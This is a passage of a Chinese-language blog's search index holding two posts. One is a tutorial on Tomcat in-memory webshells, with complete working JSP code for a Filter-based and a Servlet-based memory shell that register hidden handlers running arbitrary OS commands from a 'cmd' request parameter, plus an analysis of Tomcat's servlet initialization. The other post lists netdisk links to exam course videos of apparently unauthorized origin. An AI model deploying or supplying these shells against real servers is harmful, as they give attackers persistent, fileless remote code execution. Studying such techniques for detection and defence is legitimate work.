class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.*, java.lang.reflect.*, java.util.*, javax.servlet.*, javax.servlet.Filter, javax.servlet.FilterConfig, javax.servlet.FilterChain, javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.ServletException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext, org.apache.catalina.core.StandardContext, org.apache.tomcat.util.descriptor.web.FilterDef, org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig, org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  public class Shell_Filter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123; &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">      response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">      String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">      if (cmd != null) &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        InputStream inputStream = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, &quot;UTF-8&quot;));</span><br><span class="line">        StringBuilder output = new StringBuilder(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">          output.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        output.append(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        response.getWriter().write(output.toString());</span><br><span class="line">        reader.close();</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  try &#123;</span><br><span class="line">    // 获取 StandardContext</span><br><span class="line">    ServletContext servletContext = request.getServletContext();</span><br><span class="line">    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appContextField.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    standardContextField.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    // 定义 Filter</span><br><span class="line">    Shell_Filter filter = new Shell_Filter();</span><br><span class="line">    String filterName = &quot;CommonFilter&quot;;</span><br><span class="line"></span><br><span class="line">    // 创建 FilterDef</span><br><span class="line">    FilterDef filterDef = new FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    // 创建 FilterMap</span><br><span class="line">    FilterMap filterMap = new FilterMap();</span><br><span class="line">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">    // 通过反射获取 filterConfigs 并添加新 filter</span><br><span class="line">    Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">    filterConfigsField.setAccessible(true);</span><br><span class="line">    Map filterConfigs = (Map) filterConfigsField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    // 反射创建 ApplicationFilterConfig</span><br><span class="line"></span><br><span class="line">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">    filterConfigs.put(filterName, filterConfig);</span><br><span class="line">    response.getWriter().println(&quot;Injection successful!&quot;);</span><br><span class="line"></span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">    e.printStackTrace(response.getWriter());</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先访问jsp文件</p><p><img src="/./../img/ma/image-20250221130802895.png" alt="image-20250221130802895"></p><p>再访问任意路由执行命令</p><p><img src="/./../img/ma/image-20250221130853382.png" alt="image-20250221130853382"></p><h3 id="Servlet型内存马"><a href="#Servlet型内存马" class="headerlink" title="Servlet型内存马"></a>Servlet型内存马</h3><h4 id="编写一个简单的Servlet"><a href="#编写一个简单的Servlet" class="headerlink" title="编写一个简单的Servlet"></a>编写一个简单的Servlet</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.example.Servletshell;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Myservlet  extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        resp.getWriter().println(&quot;myservlet&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>web.xml配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;Myservlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.Servletshell.Myservlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Myservlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/my&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>访问&#x2F;my</p><p><img src="/./../img/ma/image-20250221134435949.png" alt="image-20250221134435949"></p><h4 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h4><p>先看调用栈</p><p><img src="/./../img/ma/image-20250221184859855.png" alt="image-20250221184859855"></p><p>我们知道wrapper负责封装Servlet，因此我们从Wrapper的创建开始来探究Servlet的初始化流程。于是我们来到ContextConfig#configureContext</p><p><img src="/./../img/ma/image-20250221180647327.png" alt="image-20250221180647327"></p><p>接下来我们看ContextConfig#configureContext中的这段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">for (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            Wrapper wrapper = context.createWrapper();</span><br><span class="line">            //控制 Servlet 在 Web 应用启动时是否提前加载，以及确定加载的顺序</span><br><span class="line">            if (servlet.getLoadOnStartup() != null) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            if (servlet.getEnabled() != null) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            //设置ServletName属性</span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            for (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            for (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            //设置ServletClass属性</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            MultipartDef multipartdef = servlet.getMultipartDef();</span><br><span class="line">            if (multipartdef != null) &#123;</span><br><span class="line">                long maxFileSize = -1;</span><br><span class="line">                long maxRequestSize = -1;</span><br><span class="line">                int fileSizeThreshold = 0;</span><br><span class="line"></span><br><span class="line">                if(null != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                if(null != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                if(null != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(new MultipartConfigElement(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            if (servlet.getAsyncSupported() != null) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            //将包装好的StandWrapper添加进ContainerBase的children属性中</span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        //添加路径映射</span><br><span class="line">        for (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>解析 web.xml 文件中的 servlet 配置，将 servlet 及其属性（启动顺序、类名、参数等）注册到 Web 容器的 <code>context</code> 中，并设置 URL 映射。</p><p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p><ul><li>创建<code>Wapper</code>对象；</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li><li>设置<code>Servlet</code>的名称；</li><li>设置<code>Servlet</code>的<code>class</code>；</li><li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li><li>将<code>url</code>和<code>servlet</code>类做映射</li></ul><p><img src="/./../img/ma/image-20250219105450965.png" alt="image-20250219105450965"></p><p>接着我们查找谁调用了ContextConfig#configureContext</p><p><img src="/./../img/ma/image-20250221185136053.png" alt="image-20250221185136053"></p><p>点进去ContextConfig#webConfig</p><p>我们发现<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p><p><img src="/./../img/ma/image-20250221185436167.png" alt="image-20250221185436167"></p><p>接着我们跟着调用栈，从上往下跟到StandardContext#startInternal，通过findChildren()获取StandardWrapper类</p><p><img src="/./../img/ma/image-20250221220608281.png" alt="image-20250221220608281"></p><p>然后加载完listener、filter，通过<code>loadOnStartUp()</code>方法加载wrapper</p><p><img src="/./../img/ma/image-20250222000027721.png" alt="image-20250222000027721"></p><p>跟进loadOnStartup，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public boolean loadOnStartup(Container children[]) &#123;</span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();</span><br><span class="line">    for (Container child : children) &#123;</span><br><span class="line">        Wrapper wrapper = (Wrapper) child;</span><br><span class="line">        int loadOnStartup = wrapper.getLoadOnStartup();</span><br><span class="line">        if (loadOnStartup &lt; 0) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        Integer key = Integer.valueOf(loadOnStartup);</span><br><span class="line">        map.computeIfAbsent(key, k -&gt; new ArrayList&lt;&gt;()).add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        for (Wrapper wrapper : list) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; catch (ServletException e) &#123;</span><br><span class="line">                getLogger().error(</span><br><span class="line">                        sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;, getName(), wrapper.getName()),</span><br><span class="line">                        StandardWrapper.getRootCause(e));</span><br><span class="line">                if (getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loadOnStartup</code> 的标准值遵循 Servlet 规范：<strong>负值表示容器不自动加载（首次请求时初始化），0 或正值表示容器启动时按数值从小到大顺序加载</strong></p><h4 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h4><p>根据我们上面的分析可以得出以下结论：</p><p>如果我们想要写一个<code>Servlet</code>内存马，需要经过以下步骤：</p><ul><li>寻找<code>StandardContext</code></li><li>继承并编写一个恶意<code>servlet</code></li><li>创建<code>Wapper</code>对象</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</li><li>设置<code>Servlet</code>的<code>Name</code></li><li>设置<code>Servlet</code>对应的<code>Class</code></li><li>将<code>Servlet</code>添加到<code>context</code>的<code>children</code>中</li><li>将<code>url</code>路径和<code>servlet</code>类做映射</li></ul><p>完整poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  public class Memshell extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init() throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">      response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">      String  cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">      if(cmd != null)&#123;</span><br><span class="line">        Process p =  Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;);</span><br><span class="line">        InputStream input = p.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        response.getWriter().write(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while((line = br.readLine()) != null) &#123;</span><br><span class="line">          response.getWriter().write(line);</span><br><span class="line">        &#125;</span><br><span class="line">        response.getWriter().write(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        p.getOutputStream().close();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  //System.out.println(request.getServletContext());</span><br><span class="line">  Memshell memshell = new Memshell();</span><br><span class="line">  ServletContext servletContext = request.getServletContext();</span><br><span class="line">  Field contextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">  contextField.setAccessible(true);</span><br><span class="line">  ApplicationContext applicationContext = (ApplicationContext)contextField.get(servletContext);</span><br><span class="line">  Field applicationContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">  applicationContextField.setAccessible(true);</span><br><span class="line">  StandardContext standardContext = (StandardContext)applicationContextField.get(applicationContext);</span><br><span class="line">  Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">  wrapper.setName(&quot;memshell&quot;);</span><br><span class="line">  wrapper.setServletClass(memshell.getClass().getName());</span><br><span class="line">  wrapper.setServlet(memshell);</span><br><span class="line">  standardContext.addChild(wrapper);</span><br><span class="line">  standardContext.addServletMappingDecoded(&quot;/shell&quot;, &quot;memshell&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>访问memshell.jsp文件</p><p>访问对应路径进行命令执行</p><p><img src="/./../img/ma/image-20250222002830136.png" alt="image-20250222002830136"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>写这篇关于传统Web应用内存马（Tomcat内存马）的文章时，我深刻感受到自己在安全技术领域仍有许多不足之处。尽管我通过学习和实践积累了一些经验，但在分析和理解这一领域复杂性时，依然存在许多盲点和不足。每次思考和写作时，我都能感受到自己的技术水平还不够成熟，很多细节和安全策略需要进一步完善。</p><p>这篇文章的完成，也让我更加意识到，网络安全是一个永无止境的学习过程。随着技术的不断发展和攻击手段的不断演进，我们必须时刻保持谦虚，保持对新技术的敏感，并不断提升自己的能力。在未来的工作中，我会继续深入探索和研究，努力弥补现有的不足，提升自己的技术水平，以便更好地应对日益复杂的网络安全挑战。</p><p>希望这篇文章能够为读者提供一些参考，也希望能得到更多来自朋友的指导和建议，共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/23/hello-world/"/>
      <url>/2025/02/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>首先你要开心，剩下的无所谓，日子长长总会如愿以偿。</p><p>首先说明下，现在手里资料很多，光复制粘贴手都麻了，所以想看什么学习的课程直接联系我qq(3238554134),我直接找到推到网站。</p><p>正常注册百度网盘只有200G空间，但是以下的链接可以领取大约400G，有效期为一个月，但是每个月都能领取。以下的课程只需要你们选取自己需要的，直接保存进你们自己的网盘，然后会自动更新（都是最新的课程）。这些视频的来源不想多解释，视屏里可能会出现某些卖课机构的水印，无需多理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/comps/view/MV84NTZfMTAzMF8yODU2X29ubGluZQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至于下载速度问题，别傻乎乎地原价充vip，以下是学生认证优惠。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/comps/view/MV8xMTE2XzEzODVfMzk1NF9vbmxpbmU=?active_svip=1y_auto&amp;activetab=svip&amp;from=shequn&amp;activity_id=132686988468&amp;ext=%7B%22bcode%22%3A%2283393974a85c1375873a3b77a755127d8133337fa257167783383374a25b1573803f3177a05f1c7685%22%7D</span><br></pre></td></tr></table></figure><h2 id="考研"><a href="#考研" class="headerlink" title="考研"></a>考研</h2><h3 id="26考研公共课"><a href="#26考研公共课" class="headerlink" title="26考研公共课"></a>26考研公共课</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/s/1xtYesAqPqIchJ05IjY6ilA?<span class="built_in">pwd</span>=6666#list/path=%2F</span><br></pre></td></tr></table></figure><h3 id="26考研专业课"><a href="#26考研专业课" class="headerlink" title="26考研专业课"></a>26考研专业课</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=c6xrvFmlMS-EWlNjuPvrog&amp;<span class="built_in">pwd</span>=6666</span><br></pre></td></tr></table></figure><h2 id="25四六级"><a href="#25四六级" class="headerlink" title="25四六级"></a>25四六级</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=d9umNISloYFtmrwBx1DF3Q&amp;<span class="built_in">pwd</span>=6666</span><br><span class="line">https://pan.baidu.com/s/1d9umNISloYFtmrwBx1DF3Q?<span class="built_in">pwd</span>=6666#list/path=%2F</span><br></pre></td></tr></table></figure><h2 id="教资、"><a href="#教资、" class="headerlink" title="教资、"></a>教资、</h2><p>2025山东教基</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=B7w2zmutZjth5qsRQqGKdQ&amp;<span class="built_in">pwd</span>=6666</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2025全国教综</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=I2cTs60V1gmq2z5r6gRgjg&amp;pwd=6666</span><br></pre></td></tr></table></figure><p>2025年教招语文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.quark.cn/s/6e0831b350e2#/list/share</span><br></pre></td></tr></table></figure><p>2025上中学系统班</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=3a8fjqWMTiBq932bSRFSLQ&amp;pwd=6666</span><br></pre></td></tr></table></figure><p>2025上小学系统班</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/share/init?surl=ULOQh2gA1mVX-4Cr8uF5hA&amp;pwd=6666</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -学习资料 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
